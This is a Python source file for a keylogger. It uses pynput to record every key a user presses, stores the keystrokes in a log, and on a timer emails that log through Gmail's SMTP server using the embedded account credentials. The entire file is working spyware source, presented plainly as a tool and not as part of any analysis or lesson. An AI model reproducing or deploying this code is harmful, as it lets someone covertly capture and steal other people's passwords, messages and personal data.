import smtplib
import threading
import pynput.keyboard

curKey = " "


class Keylogger:

    def __init__(self, interval, email, password):
        self.log = "Keylogger has been started"
        self.interval = interval
        self.email = email
        self.password = password

    def stringAppend(self, string):
        self.log = self.log + string

    def processKeyPress(self, key):
        global curKey
        try:
            curKey = str(key.char)
        except AttributeError:
            if str(key) == 'Key.space':
                curKey = " "
            else:
                curKey = curKey + " " + str(key) + " "

        self.stringAppend(curKey)

    def sendMail(self, email, password, msg):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg)
        server.quit()

    def report(self):
        self.sendMail(self.email, self.password, self.log)
        # print(self.log)
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keybordListner = pynput.keyboard.Listener(on_press=self.processKeyPress)
        with keybordListner:
            self.report()
            keybordListner.join()
